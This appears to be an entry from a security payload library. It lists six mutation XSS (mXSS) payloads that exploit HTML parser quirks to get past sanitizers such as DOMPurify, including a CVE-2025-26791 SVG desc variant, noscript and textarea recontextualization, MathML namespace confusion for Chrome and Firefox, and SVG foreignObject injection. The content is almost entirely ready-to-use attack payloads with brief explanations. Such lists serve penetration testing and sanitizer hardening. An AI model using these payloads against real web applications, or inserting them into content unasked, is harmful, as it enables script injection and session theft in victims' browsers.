---
id: "xss-mxss-payloads"
title: "XSS Payloads - Mutation XSS (mXSS)"
type: "payload"
category: "web-application"
subcategory: "xss"
tags: ["xss", "mxss", "payload"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["xss-techniques"]
updated: "2026-03-30"
---

## Overview

Exploit browser HTML parser quirks where sanitized HTML mutates into executable JS during DOM insertion

## Payloads

### DOMPurify SVG Desc (CVE-2025-26791)

DOMPurify regex fails on template literals in SVG desc — executes after mutation

- **Contexts**: html
- **Severity**: high

```html
<svg><desc>\onload=${alert(1337)}</desc></svg>
```

### DOMPurify Noscript Recontextualization

noscript contents treated as text during sanitization, re-evaluated as HTML on insertion

- **Contexts**: html
- **Severity**: high

```html
<noscript><img src=x onerror=alert(1)></noscript>
```

### MathML Namespace Confusion (Chrome)

mglyph switches namespaces — style tag text becomes live HTML after mutation

- **Contexts**: html
- **Severity**: high

```html
<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">
```

### MathML Namespace Confusion (Firefox)

Firefox CDATA variant of the MathML namespace confusion mXSS

- **Contexts**: html
- **Severity**: high

```html
<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]><img src=1 onerror=alert(1)>">
```

### Textarea Raw Text Mutation

Textarea rawtext contents re-evaluated as HTML in re-contextualization

- **Contexts**: html
- **Severity**: high

```html
<textarea><img src=x onerror=alert(1)></textarea>
```

### SVG ForeignObject Mutation

foreignObject switches from SVG to HTML namespace — enables tag injection

- **Contexts**: html
- **Severity**: high

```html
<svg><foreignObject><iframe/onload=alert(1)></foreignObject></svg>
```
